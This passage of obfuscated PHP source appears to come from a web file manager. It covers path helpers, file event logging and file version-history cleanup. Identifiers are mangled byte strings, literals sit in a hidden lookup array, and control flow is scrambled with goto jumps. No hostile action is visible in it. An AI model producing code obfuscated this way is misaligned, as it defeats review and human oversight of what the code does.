sourceID($a‹µØƒÑä) { $FÒ–î·”İÑ =& $_SERVER[…Ò×–]; $A×ÊìŒò™® = self::parse($a‹µØƒÑä); if ($A×ÊìŒò™®[$FÒ–î·”İÑ[29]] !== self::KOD_SOURCE) { show_json(LNG($FÒ–î·”İÑ[1084]), !1); } return $A×ÊìŒò™®[$FÒ–î·”İÑ[371]]; } public static function make($E¸¦¸¡…ã°) { if (!$E¸¦¸¡…ã°) { return !1; } return self::makePath(self::KOD_SOURCE, intval($E¸¦¸¡…ã°)); } public static function makeShare($C”É‘†æğí, $eÙ£¾ÚŠƒ) { return self::makePath(self::KOD_SHARE_ITEM, $C”É‘†æğí, $eÙ£¾ÚŠƒ); } public static function makeFileTypePath($Bİ¸ÔÓÅÓ£) { return self::makePath(self::KOD_USER_FILE_TYPE, $Bİ¸ÔÓÅÓ£); } public static function makeFileTagPath($dŠàŠÀŒã¤) { return self::makePath(self::KOD_USER_FILE_TAG, $dŠàŠÀŒã¤); } public static function makePath($bÊŒ–ù›øÈ, $eÑğ§Ô¤™ã = '', $Aªòô…É¢Å = '') { $d×ƒŒ‘­‰ =& $_SERVER[…Ò×–]; $Aõò¹ò‰©¶ = substr($bÊŒ–ù›øÈ, 1, -1); $E‰êóƒÕÍ® = $d×ƒŒ‘­‰[1085] . $Aõò¹ò‰©¶ . $d×ƒŒ‘­‰[1086] . $eÑğ§Ô¤™ã . $d×ƒŒ‘­‰[1087]; $E‰êóƒÕÍ® = $Aªòô…É¢Å ? $E‰êóƒÕÍ® . $Aªòô…É¢Å . $d×ƒŒ‘­‰[8] : $E‰êóƒÕÍ®; return $E‰êóƒÕÍ®; } public static function hashPath($cÌÅ‹£Ø•Á) { $A¤ã¥¿œ… =& $_SERVER[…Ò×–]; $aƒ©ºù–‡Ï = is_array($cÌÅ‹£Ø•Á) ? $cÌÅ‹£Ø•Á : IO::info($cÌÅ‹£Ø•Á); $E†Çµ©ÉÈ¦ = _get($aƒ©ºù–‡Ï, $A¤ã¥¿œ…[1088], $A¤ã¥¿œ…[33]); if (!$E†Çµ©ÉÈ¦) { $AÑñµÅïŒî = KodIO::parse($aƒ©ºù–‡Ï[$A¤ã¥¿œ…[75]]); if (!$AÑñµÅïŒî[$A¤ã¥¿œ…[29]]) { $E†Çµ©ÉÈ¦ = IO::hashSimple($aƒ©ºù–‡Ï[$A¤ã¥¿œ…[75]]); } } if (!$E†Çµ©ÉÈ¦) { $E†Çµ©ÉÈ¦ = md5($aƒ©ºù–‡Ï[$A¤ã¥¿œ…[75]] . $aƒ©ºù–‡Ï[$A¤ã¥¿œ…[77]] . $aƒ©ºù–‡Ï[$A¤ã¥¿œ…[107]]); } return $E†Çµ©ÉÈ¦; } public static function initSystemPath() { $CâÜùéÂá =& $_SERVER[…Ò×–]; if (defined($CâÜùéÂá[1089])) { return; } define($CâÜùéÂá[1089], self::systemPath($CâÜùéÂá[1090])); define($CâÜùéÂá[1091], self::systemPath($CâÜùéÂá[1092])); define($CâÜùéÂá[1093], self::systemPath($CâÜùéÂá[1094])); define($CâÜùéÂá[1095], self::systemPath($CâÜùéÂá[1096])); } public static function systemPath($CÃŠÑÓó¿) { goto d­Ù×À¢óõ; d­Ù×À¢óõ: $E§‡´Šã¦« =& $_SERVER[…Ò×–]; $b„­ç…ß‰Û = $E§‡´Šã¦«[1097] . ucfirst($CÃŠÑÓó¿); $E¼‘”ë¨“Ä = Model($E§‡´Šã¦«[1098])->get($b„­ç…ß‰Û); goto B®ÒÉ›ìóÏ; B®ÒÉ›ìóÏ: if ($E¼‘”ë¨“Ä) { return $E¼‘”ë¨“Ä; } if ($CÃŠÑÓó¿ == $E§‡´Šã¦«[1090]) { $E¼‘”ë¨“Ä = self::make(Model($E§‡´Šã¦«[757])->systemRootPathAdd($E§‡´Šã¦«[1099])); } else { $E¼‘”ë¨“Ä = self::systemPath($E§‡´Šã¦«[1090]); $C¦¢»ëß™ = self::sourceID($E¼‘”ë¨“Ä); $E¼‘”ë¨“Ä = self::make(Model($E§‡´Šã¦«[757])->mkdir($C¦¢»ëß™, $CÃŠÑÓó¿)); } Model($E§‡´Šã¦«[1098])->set($b„­ç…ß‰Û, $E¼‘”ë¨“Ä); goto DÑÙƒÊğİÊ; DÑÙƒÊğİÊ: return $E¼‘”ë¨“Ä; goto BÉÛÒ¹ğ“Ã; BÉÛÒ¹ğ“Ã: } public static function systemFolder($E É¥ƒ–è) { $C·éñùŒÅ› = IO_PATH_SYSTEM_SOURCE . $E É¥ƒ–è; $E…Êõåˆ×å = Cache::get($C·éñùŒÅ›); if (!$E…Êõåˆ×å) { $bâ†ˆŸ¦Å = IO::infoFull($C·éñùŒÅ›); if (!$bâ†ˆŸ¦Å) { $E…Êõåˆ×å = IO::mkdir($C·éñùŒÅ›, REPEAT_SKIP); } else { $E…Êõåˆ×å = $bâ†ˆŸ¦Å[$_SERVER[…Ò×–][75]]; } Cache::set($C·éñùŒÅ›, $E…Êõåˆ×å, 3600 * 10); } return $E…Êõåˆ×å; } public static function defaultDriver() { return Model($_SERVER[…Ò×–][708])->defaultDriver(); } public static function defaultIO() { $b­¯ƒ¶ù¦ =& $_SERVER[…Ò×–]; $A‘¹¶»äÂ = self::defaultDriver(); return $b­¯ƒ¶ù¦[1100] . $A‘¹¶»äÂ[$b­¯ƒ¶ù¦[371]] . $b­¯ƒ¶ù¦[1087]; } public static function defaultDriverInit() { static $Bõˆ•³ßè½ = false; if ($Bõˆ•³ßè½) { return $Bõˆ•³ßè½; } $Bõˆ•³ßè½ = IO::init(self::defaultIO()); return $Bõˆ•³ßè½; } public static function fileTypeList() { $BœóãÕçèŞ =& $_SERVER[…Ò×–]; $Cˆ…Œ®ôç‚ = $GLOBALS[$BœóãÕçèŞ[6]][$BœóãÕçèŞ[1101]]; foreach ($Cˆ…Œ®ôç‚ as $c¸ÅïŠ«Ù => $eÁ°Çèò‰) { $aÍ¾ì£Ã²œ = $BœóãÕçèŞ[1102] . $c¸ÅïŠ«Ù; $bÛ¡Ññƒ = LNG($aÍ¾ì£Ã²œ); if ($aÍ¾ì£Ã²œ != $bÛ¡Ññƒ) { $Cˆ…Œ®ôç‚[$c¸ÅïŠ«Ù][$BœóãÕçèŞ[28]] = $bÛ¡Ññƒ; } } return $Cˆ…Œ®ôç‚; } public static function transferType($E™âŠÓÂŒÇ, $B†Ä…„šÒ§) { goto aë§ğ¨ˆ¼Æ; B‘ŞÀôØ†: return $FÊÕª´õà«[1105]; goto fíÛŠ£ö„; BñŞÉö²‘Ë: if ($Cğ‰‚µ’Ší[$FÊÕª´õà«[29]] == $C¥âàò°š°[$FÊÕª´õà«[29]] && $Cğ‰‚µ’Ší[$FÊÕª´õà«[1103]] == $C¥âàò°š°[$FÊÕª´õà«[1103]]) { return $FÊÕª´õà«[1104]; } if ($Cğ‰‚µ’Ší[$FÊÕª´õà«[29]] == $FÊÕª´õà«[787] && $C¥âàò°š°[$FÊÕª´õà«[29]] == $FÊÕª´õà«[102]) { return $FÊÕª´õà«[1051]; } if ($Cğ‰‚µ’Ší[$FÊÕª´õà«[29]] == $FÊÕª´õà«[102] && $C¥âàò°š°[$FÊÕª´õà«[29]] == $FÊÕª´õà«[787]) { return $FÊÕª´õà«[103]; } goto B‘ŞÀôØ†; aë§ğ¨ˆ¼Æ: $FÊÕª´õà« =& $_SERVER[…Ò×–]; $Cğ‰‚µ’Ší = self::driverType($E™âŠÓÂŒÇ); $C¥âàò°š° = self::driverType($B†Ä…„šÒ§); goto BñŞÉö²‘Ë; fíÛŠ£ö„: } public static function driverType($FÇÜå‰ŠòÕ) { goto a§»ºíÛò; a§»ºíÛò: $Cë¥Å²…–» =& $_SERVER[…Ò×–]; $BÎ–¶ÅÃÙ¬ = $FÇÜå‰ŠòÕ->path; $F˜ÇŒ½‹™Õ = str_replace($Cë¥Å²…–»[1106], $Cë¥Å²…–»[33], strtolower($FÇÜå‰ŠòÕ->getType())); goto AØÍÉ„òã; b›ª†ìŸ‹: return array($Cë¥Å²…–»[29] => $Cë¥Å²…–»[787], $Cë¥Å²…–»[1103] => $FÇÜå‰ŠòÕ->pathDriver, $Cë¥Å²…–»[75] => $BÎ–¶ÅÃÙ¬); goto F‰¯¶¾ÏÖ™; AØÍÉ„òã: if ($F˜ÇŒ½‹™Õ == $Cë¥Å²…–»[699] || $F˜ÇŒ½‹™Õ == $Cë¥Å²…–»[1107] || $F˜ÇŒ½‹™Õ == $Cë¥Å²…–»[1108]) { $FÇÜå‰ŠòÕ = self::defaultDriverInit(); } else { if ($F˜ÇŒ½‹™Õ == $Cë¥Å²…–»[1058] || $F˜ÇŒ½‹™Õ == $Cë¥Å²…–»[1109]) { $FÇÜå‰ŠòÕ = IO::init($FÇÜå‰ŠòÕ->pathParse[$Cë¥Å²…–»[1005]]); } } $F˜ÇŒ½‹™Õ = str_replace($Cë¥Å²…–»[1106], $Cë¥Å²…–»[33], strtolower($FÇÜå‰ŠòÕ->getType())); if ($F˜ÇŒ½‹™Õ == $Cë¥Å²…–»[102]) { return array($Cë¥Å²…–»[29] => $Cë¥Å²…–»[102], $Cë¥Å²…–»[1103] => $Cë¥Å²…–»[33], $Cë¥Å²…–»[75] => $BÎ–¶ÅÃÙ¬); } goto b›ª†ìŸ‹; F‰¯¶¾ÏÖ™: } } goto cô‰‘ÎŠ¨Ù; B‡ò»Ş ¥ò: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\162\x63\x65\x5f\x65\x76\x65\x6e\x74"; protected $dataAuto = array(array("\x63\x72\145\x61\164\x65\x54\x69\155\x65", "\x74\x69\x6d\x65", "\x69\156\163\145\x72\x74", "\146\x75\156\143\x74\x69\x6f\x6e"), array("\x64\145\163\x63", '', "\151\x6e\x73\145\162\x74\x2c\x75\160\144\141\x74\145\54\163\x65\154\145\143\x74", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($c‰Çöœ¬§Ü, $AÏç£©Â¡¨, $fˆ˜£×ƒµ¬ = '') { goto eä·Íêİ; FÂ†ŠÅÄæ¤: $aŠÎÍ°˜¹À = array($D›—Á±Àİ[387] => $c‰Çöœ¬§Ü, $D›—Á±Àİ[2322] => $E³ŸÆŒ”¾[$D›—Á±Àİ[466]], $D›—Á±Àİ[2323] => $E³ŸÆŒ”¾[$D›—Á±Àİ[28]], $D›—Á±Àİ[471] => $E³ŸÆŒ”¾[$D›—Á±Àİ[471]], $D›—Á±Àİ[1441] => USER_ID, $D›—Á±Àİ[392] => $AÏç£©Â¡¨, $D›—Á±Àİ[1443] => $fˆ˜£×ƒµ¬); $this->addSystemLog($AÏç£©Â¡¨, $aŠÎÍ°˜¹À); return $this->add($aŠÎÍ°˜¹À); goto EŠØÑ¦³İ”; eä·Íêİ: $D›—Á±Àİ =& $_SERVER[…Ò×–]; if (!$this->eventSave) { return; } $E³ŸÆŒ”¾ = Model($D›—Á±Àİ[1127])->sourceInfo($c‰Çöœ¬§Ü); goto bİÓ´èŸ‰Ë; bİÓ´èŸ‰Ë: if (!$E³ŸÆŒ”¾) { return !1; } if ($this->isCacheEvent($E³ŸÆŒ”¾, $AÏç£©Â¡¨)) { return; } if ($fˆ˜£×ƒµ¬ && is_string($fˆ˜£×ƒµ¬)) { $fˆ˜£×ƒµ¬ = array($D›—Á±Àİ[2150] => $fˆ˜£×ƒµ¬); } goto FÂ†ŠÅÄæ¤; EŠØÑ¦³İ”: } private function addSystemLog($e ÜäŒˆ«‹, $b÷ñìÎè²) { $C‘Ò¦İÏ”ï =& $_SERVER[…Ò×–]; if ($e ÜäŒˆ«‹ == $C‘Ò¦İÏ”ï[2324]) { $e ÜäŒˆ«‹ = $b÷ñìÎè²[$C‘Ò¦İÏ”ï[409]][$C‘Ò¦İÏ”ï[2325]]; } else { if (in_array($e ÜäŒˆ«‹, array($C‘Ò¦İÏ”ï[2096], $C‘Ò¦İÏ”ï[2326]))) { $e ÜäŒˆ«‹ = $b÷ñìÎè²[$C‘Ò¦İÏ”ï[409]][$C‘Ò¦İÏ”ï[697]]; } } $eÆ„ğ’Æ×§ = array_merge($b÷ñìÎè², array($C‘Ò¦İÏ”ï[2327] => $b÷ñìÎè²[$C‘Ò¦İÏ”ï[373]], $C‘Ò¦İÏ”ï[2328] => $b÷ñìÎè²[$C‘Ò¦İÏ”ï[2328]])); Model($C‘Ò¦İÏ”ï[2059])->addLog($C‘Ò¦İÏ”ï[2329] . $e ÜäŒˆ«‹, $eÆ„ğ’Æ×§); } private function isCacheEvent($CÔ—ÀëÙ§•, $BâÈ…ğ›…ƒ) { if ($CÔ—ÀëÙ§•[$_SERVER[…Ò×–][375]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($AÊÃĞ÷‹, $F£»ğ¨…¯) { $BÈÕØêÓëÕ =& $_SERVER[…Ò×–]; $aÜÇìˆâ = Model($BÈÕØêÓëÕ[1127])->sourceInfo($AÊÃĞ÷‹); $dĞÇÓÕÄšé = array($BÈÕØêÓëÕ[2325] => $F£»ğ¨…¯, $BÈÕØêÓëÕ[28] => $aÜÇìˆâ[$BÈÕØêÓëÕ[28]]); return $this->addEvent($AÊÃĞ÷‹, $BÈÕØêÓëÕ[2324], $dĞÇÓÕÄšé); } public function eventFileEdit($dáÕùô¤ƒ) { $b‰ÕÒÏ¾¤ß =& $_SERVER[…Ò×–]; $CÆæ¸÷Éí = array($b‰ÕÒÏ¾¤ß[2330] => $_SERVER[$b‰ÕÒÏ¾¤ß[2331]], $b‰ÕÒÏ¾¤ß[1763] => strtolower(ACTION)); return $this->addEvent($dáÕùô¤ƒ, $b‰ÕÒÏ¾¤ß[2086], $CÆæ¸÷Éí); } public function eventRecycle($A¶¹Œõ‡¤, $bÃ©Ïîê¨İ) { return $this->addEvent($A¶¹Œõ‡¤, $_SERVER[…Ò×–][2326], $bÃ©Ïîê¨İ); } public function eventRemove($BŠ…Õğ„á) { $bœ´©Ä÷„à =& $_SERVER[…Ò×–]; $C¤««¹ã™ = Model($bœ´©Ä÷„à[1127])->sourceInfo($BŠ…Õğ„á); $böÛ¦‡îÔ‚ = $C¤««¹ã™[$bœ´©Ä÷„à[28]]; return $this->addEvent($C¤««¹ã™[$bœ´©Ä÷„à[466]], $bœ´©Ä÷„à[2085], $böÛ¦‡îÔ‚); } public function eventShare($a­æ°ß×Ç„, $bç°ÒŠ°½) { return $this->addEvent($a­æ°ß×Ç„, $_SERVER[…Ò×–][2096], $bç°ÒŠ°½); } public function eventMove($dÓ†¤ŒÒšÀ, $CÌ¶³ŠÒµô, $Bœ´¨ŒêÛÃ) { goto fÊ‡¥’¶‘; A±É®×ãÇ: $fÀâÃÜæ¥À = $dï­‹ø²÷->sourceInfo($CÌ¶³ŠÒµô); $c¡¡…µŸ¾Ç = $dï­‹ø²÷->sourceInfo($Bœ´¨ŒêÛÃ); $aå ª½ìŒÓ = array($eÌã„¡Ì´­[1014] => $CÌ¶³ŠÒµô, $eÌã„¡Ì´­[2332] => $fÀâÃÜæ¥À[$eÌã„¡Ì´­[28]], $eÌã„¡Ì´­[2333] => $fÀâÃÜæ¥À[$eÌã„¡Ì´­[471]], $eÌã„¡Ì´­[1015] => $Bœ´¨ŒêÛÃ, $eÌã„¡Ì´­[2334] => $c¡¡…µŸ¾Ç[$eÌã„¡Ì´­[28]], $eÌã„¡Ì´­[2335] => $c¡¡…µŸ¾Ç[$eÌã„¡Ì´­[471]]); goto fÔˆğ®ØÖ; fÔˆğ®ØÖ: $this->addEvent($dÓ†¤ŒÒšÀ, $eÌã„¡Ì´­[497], $aå ª½ìŒÓ); $Cò¹»èÒÔ´ = $dï­‹ø²÷->sourceInfo($dÓ†¤ŒÒšÀ); $aå ª½ìŒÓ = array($eÌã„¡Ì´­[373] => $Cò¹»èÒÔ´[$eÌã„¡Ì´­[373]], $eÌã„¡Ì´­[28] => $Cò¹»èÒÔ´[$eÌã„¡Ì´­[28]]); goto fç®í¾ª³; fç®í¾ª³: $this->addEvent($CÌ¶³ŠÒµô, $eÌã„¡Ì´­[2336], $aå ª½ìŒÓ); goto Aé‘ùÙ–ÎÌ; fÊ‡¥’¶‘: $eÌã„¡Ì´­ =& $_SERVER[…Ò×–]; $dï­‹ø²÷ = Model($eÌã„¡Ì´­[1127]); $Cò¹»èÒÔ´ = $dï­‹ø²÷->sourceInfo($dÓ†¤ŒÒšÀ); goto A±É®×ãÇ; Aé‘ùÙ–ÎÌ: } public function eventCopy($DÁÑ³Ü˜¥è) { $this->eventCreate($DÁÑ³Ü˜¥è, $_SERVER[…Ò×–][495]); } public function eventRename($f¹ê¹¸†é, $eÏÙêÄ¥‘³, $aâÍ‰Ûˆ¤¬) { $E¯‡áÎ‹Õ² =& $_SERVER[…Ò×–]; $E•²ÎÉÌï¡ = array($E¯‡áÎ‹Õ²[1014] => $eÏÙêÄ¥‘³, $E¯‡áÎ‹Õ²[1015] => $aâÍ‰Ûˆ¤¬); return $this->addEvent($f¹ê¹¸†é, $E¯‡áÎ‹Õ²[1143], $E•²ÎÉÌï¡); } public function eventAddComment($Fç‘åµöâë, $B›ìä§Ö‰¤) { return $this->addEvent($Fç‘åµöâë, $_SERVER[…Ò×–][2337], $B›ìä§Ö‰¤); } public function eventAddDesc($eç½ó†„¶, $AäœÓ…ïÎ²) { return $this->addEvent($eç½ó†„¶, $_SERVER[…Ò×–][2338], $AäœÓ…ïÎ²); } public function listBySource($cÀ†‘ßéóÂ) { goto eâÂåó­ôŠ; eâÂåó­ôŠ: $fâ‚ºÙ¼‹Ä =& $_SERVER[…Ò×–]; $EÉ£´…˜‹î = Model($fâ‚ºÙ¼‹Ä[1127])->sourceInfo($cÀ†‘ßéóÂ); $bÅÆ£Å¢¼° = array($fâ‚ºÙ¼‹Ä[387] => $cÀ†‘ßéóÂ); goto a„Ü¡¬£Ú˜; a„Ü¡¬£Ú˜: if ($EÉ£´…˜‹î[$fâ‚ºÙ¼‹Ä[374]] == $fâ‚ºÙ¼‹Ä[83]) { $AÃğ”¥Ùâ = Model($fâ‚ºÙ¼‹Ä[1127])->listSearchChildren($cÀ†‘ßéóÂ, 20000); $AÃğ”¥Ùâ[] = $cÀ†‘ßéóÂ . $fâ‚ºÙ¼‹Ä[365]; $bÅÆ£Å¢¼° = array($fâ‚ºÙ¼‹Ä[373] => array($fâ‚ºÙ¼‹Ä[7], $AÃğ”¥Ùâ)); } $A‹Ñ¾ÍäÍ = $this->where($bÅÆ£Å¢¼°)->order($fâ‚ºÙ¼‹Ä[2339])->selectPage(); if ($A‹Ñ¾ÍäÍ[$fâ‚ºÙ¼‹Ä[355]][$fâ‚ºÙ¼‹Ä[356]] == 0) { $A‹Ñ¾ÍäÍ[$fâ‚ºÙ¼‹Ä[355]][$fâ‚ºÙ¼‹Ä[356]] = 1; $A‹Ñ¾ÍäÍ[$fâ‚ºÙ¼‹Ä[358]] = array(array($fâ‚ºÙ¼‹Ä[387] => $cÀ†‘ßéóÂ, $fâ‚ºÙ¼‹Ä[2322] => $EÉ£´…˜‹î[$fâ‚ºÙ¼‹Ä[466]], $fâ‚ºÙ¼‹Ä[1441] => $EÉ£´…˜‹î[$fâ‚ºÙ¼‹Ä[382]], $fâ‚ºÙ¼‹Ä[392] => $fâ‚ºÙ¼‹Ä[2340], $fâ‚ºÙ¼‹Ä[393] => $EÉ£´…˜‹î[$fâ‚ºÙ¼‹Ä[191]], $fâ‚ºÙ¼‹Ä[1443] => $fâ‚ºÙ¼‹Ä[33])); } goto AÈÚ¡ÙÚÑ‹; AÈÚ¡ÙÚÑ‹: return $this->eventListParse($A‹Ñ¾ÍäÍ, $cÀ†‘ßéóÂ); goto b…‡‘ï‰ìÎ; b…‡‘ï‰ìÎ: } private function eventListParse($EÒ™ë³‘‘, $d¼ù¤äñÛ¸) { goto fçâ°Ø›­–; DäĞ™ê´Ç: $DØ¶ğÖÕË = array_unique($DØ¶ğÖÕË); $fâœÁà°‡ã = array_unique(array_to_keyvalue($e º…¡ˆØá, $cÕØÙ‚æâÃ[33], $cÕØÙ‚æâÃ[1450])); $Cõ¾›†Ã¶” = Model($cÕØÙ‚æâÃ[482])->userListInfo($fâœÁà°‡ã); goto C‹¢˜ğ°éÁ; fçâ°Ø›­–: $cÕØÙ‚æâÃ =& $_SERVER[…Ò×–]; $e º…¡ˆØá = $EÒ™ë³‘‘[$cÕØÙ‚æâÃ[358]]; $DØ¶ğÖÕË = array_to_keyvalue($e º…¡ˆØá, $cÕØÙ‚æâÃ[33], $cÕØÙ‚æâÃ[373]); goto BØ•ÂÏ„Š­; BØ•ÂÏ„Š­: $dÁ½“Şë™Ç = array_to_keyvalue($e º…¡ˆØá, $cÕØÙ‚æâÃ[33], $cÕØÙ‚æâÃ[2328]); foreach ($e º…¡ˆØá as $B¡óËù–ÜÁ) { $a–Ê›¤óØä = $B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[409]]; if ($B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[29]] == $cÕØÙ‚æâÃ[497] && isset($a–Ê›¤óØä[$cÕØÙ‚æâÃ[1014]])) { $DØ¶ğÖÕË[] = $a–Ê›¤óØä[$cÕØÙ‚æâÃ[1014]] . $cÕØÙ‚æâÃ[33]; $DØ¶ğÖÕË[] = $a–Ê›¤óØä[$cÕØÙ‚æâÃ[1015]] . $cÕØÙ‚æâÃ[33]; } if ($B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[29]] == $cÕØÙ‚æâÃ[2336] && isset($a–Ê›¤óØä[$cÕØÙ‚æâÃ[373]])) { $DØ¶ğÖÕË[] = $a–Ê›¤óØä[$cÕØÙ‚æâÃ[373]] . $cÕØÙ‚æâÃ[33]; } } $DØ¶ğÖÕË = array_merge($DØ¶ğÖÕË, $dÁ½“Şë™Ç, array($d¼ù¤äñÛ¸ . $cÕØÙ‚æâÃ[33])); goto DäĞ™ê´Ç; C‹¢˜ğ°éÁ: $AŸ¬²¯ïéÚ = Model($cÕØÙ‚æâÃ[757])->sourceListInfo($DØ¶ğÖÕË, !0); foreach ($e º…¡ˆØá as &$B¡óËù–ÜÁ) { if ($B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[29]] == $cÕØÙ‚æâÃ[497] && isset($B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[409]][$cÕØÙ‚æâÃ[1014]])) { $B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[409]][$cÕØÙ‚æâÃ[1014]] = $AŸ¬²¯ïéÚ[$B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[409]][$cÕØÙ‚æâÃ[1014]]]; $B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[409]][$cÕØÙ‚æâÃ[1015]] = $AŸ¬²¯ïéÚ[$B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[409]][$cÕØÙ‚æâÃ[1015]]]; } if ($B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[29]] == $cÕØÙ‚æâÃ[2336] && isset($B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[409]][$cÕØÙ‚æâÃ[373]])) { $B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[409]][$cÕØÙ‚æâÃ[373]] = $AŸ¬²¯ïéÚ[$B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[409]][$cÕØÙ‚æâÃ[373]]]; } $B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[395]] = $AŸ¬²¯ïéÚ[$B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[373]]]; $B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[2341]] = $AŸ¬²¯ïéÚ[$B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[2328]]]; if ($B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[29]] == $cÕØÙ‚æâÃ[2085]) { $B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[2341]] = $B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[395]]; $B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[2328]] = $B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[2341]][$cÕØÙ‚æâÃ[373]]; $B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[395]] = !1; $B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[373]] = $cÕØÙ‚æâÃ[33]; } $B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[2272]] = $Cõ¾›†Ã¶”[$B¡óËù–ÜÁ[$cÕØÙ‚æâÃ[1450]]]; } unset($B¡óËù–ÜÁ); goto F‹×ÎØ£åÀ; F‹×ÎØ£åÀ: $EÒ™ë³‘‘[$cÕØÙ‚æâÃ[358]] = $e º…¡ˆØá; return $EÒ™ë³‘‘; goto Cœ®Ò‡±â‡; Cœ®Ò‡±â‡: } public function removeBySource($eç‹ß´Ò) { $bìÇ¾¢›ğ´ = array($_SERVER[…Ò×–][387] => $eç‹ß´Ò); $this->where($bìÇ¾¢›ğ´)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\x72\143\145\137\x68\151\x73\x74\157\162\x79"; public function addHistory($få¡°Úó, $cš‹¢Ú”Á— = '') { $E¥¸İİª¼§ =& $_SERVER[…Ò×–]; $A ø·›´Ğ— = array($E¥¸İİª¼§[387] => $få¡°Úó[$E¥¸İİª¼§[373]], $E¥¸İİª¼§[1441] => isset($få¡°Úó[$E¥¸İİª¼§[383]]) ? $få¡°Úó[$E¥¸İİª¼§[383]] : $få¡°Úó[$E¥¸İİª¼§[382]], $E¥¸İİª¼§[424] => $få¡°Úó[$E¥¸İİª¼§[423]], $E¥¸İİª¼§[525] => $få¡°Úó[$E¥¸İİª¼§[77]], $E¥¸İİª¼§[2342] => $cš‹¢Ú”Á—); $B¡ÍÇ…º‡œ = $GLOBALS[$E¥¸İİª¼§[6]][$E¥¸İİª¼§[84]][$E¥¸İİª¼§[2343]]; if ($B¡ÍÇ…º‡œ > 1) { $this->historyAutoClear($A ø·›´Ğ—[$E¥¸İİª¼§[373]]); $this->add($A ø·›´Ğ—); } Model($E¥¸İİª¼§[2344])->eventFileEdit($få¡°Úó[$E¥¸İİª¼§[373]]); } private function historyAutoClear($b×ø©–øøš) { goto CïÈ°ÙÏÃ”; CïÈ°ÙÏÃ”: $Bà†øÎÂÖ =& $_SERVER[…Ò×–]; $C½›’ºÃÛì = Model($Bà†øÎÂÖ[1098])->get($Bà†øÎÂÖ[2345]); $BÑ‰”ß§ä = $GLOBALS[$Bà†øÎÂÖ[6]][$Bà†øÎÂÖ[84]][$Bà†øÎÂÖ[2343]]; goto C¸«ÚÆÃ¾å; BØ¢ŠÌ„Ñª: $AòïíÂ‰ìç = array_to_keyvalue($a«Å¢¯óéå, $Bà†øÎÂÖ[33], $Bà†øÎÂÖ[423]); $AòïíÂ‰ìç = array_slice($AòïíÂ‰ìç, $d¦Ê¯Îğ½­); if (!$cÛâ×ó›º || !$AòïíÂ‰ìç) { return; } goto CéÅØ‚Åïº; CéÅØ‚Åïº: $AÏØê¢• = array($Bà†øÎÂÖ[389] => array($Bà†øÎÂÖ[7], $cÛâ×ó›º)); $this->where($AÏØê¢•)->delete(); Model($Bà†øÎÂÖ[426])->remove($AòïíÂ‰ìç); goto CÊã‘–ì‰…; C¸«ÚÆÃ¾å: $B¨•ìªõà = $C½›’ºÃÛì == $Bà†øÎÂÖ[2346] ? 3 : $BÑ‰”ß§ä; if ($BÑ‰”ß§ä <= 1) { $B¨•ìªõà = 1; } $d¦Ê¯Îğ½­ = $B¨•ìªõà - 1; goto EĞš¨ò•; AÌÅ‰áİîæ: if (!$a«Å¢¯óéå || $d¦Ê¯Îğ½­ >= count($a«Å¢¯óéå)) { return; } $cÛâ×ó›º = array_to_keyvalue($a«Å¢¯óéå, $Bà†øÎÂÖ[33], $Bà†øÎÂÖ[371]); $cÛâ×ó›º = array_slice($cÛâ×ó›º, $d¦Ê¯Îğ½­); goto BØ¢ŠÌ„Ñª; EĞš¨ò•: if ($d¦Ê¯Îğ½­ >= 500) { return; } $AÏØê¢• = array($Bà†øÎÂÖ[387] => $b×ø©–øøš); $a«Å¢¯óéå = $this->field($Bà†øÎÂÖ[2347])->where($AÏØê¢•)->order($Bà†øÎÂÖ[2339])->select(); goto AÌÅ‰áİîæ; CÊã‘–ì‰…: } public function listData($C²åêæô) { goto FßÒ¿¥Æ; FßÒ¿¥Æ: $f¦Ï¨Ò‹Ğğ =& $_SERVER[…Ò×–]; $eéçÆ¬ïÍÃ = array($f¦Ï¨Ò‹Ğğ[387] => $C²åêæô); $fÏó¨µ¸âö = $f¦Ï¨Ò‹Ğğ[2348]; goto aÍ¡ô††ö; aÍ¡ô††ö: $fŒ®§„½ÌÀ = $this->field($fÏó¨µ¸âö)->where($eéçÆ¬ïÍÃ)->order($f¦Ï¨Ò‹Ğğ[2339])->selectPage(); $this->_listAppendUser($fŒ®§„½ÌÀ[$f¦Ï¨Ò‹Ğğ[358]]); $f·¡“•œğğ = Model($f¦Ï¨Ò‹Ğğ[1098])->get($f¦Ï¨Ò‹Ğğ[2345]); goto c„Öæºôâˆ; c„Öæºôâˆ: $B¹†Û»Å¦ = 3; if ($f·¡“•œğğ == $f¦Ï¨Ò‹Ğğ[2346]) { $fŒ®§„½ÌÀ[$f¦Ï¨Ò‹Ğğ[358]] = array_slice($fŒ®§„½ÌÀ[$f¦Ï¨Ò‹Ğğ[358]], 0, $B¹†Û»Å¦); $fŒ®§„½ÌÀ[$f¦Ï¨Ò‹Ğğ[355]] = array($f¦Ï¨Ò‹Ğğ[2349] => 1, $f¦Ï¨Ò‹Ğğ[2350] => 20, $f¦Ï¨Ò‹Ğğ[2351] => 1, 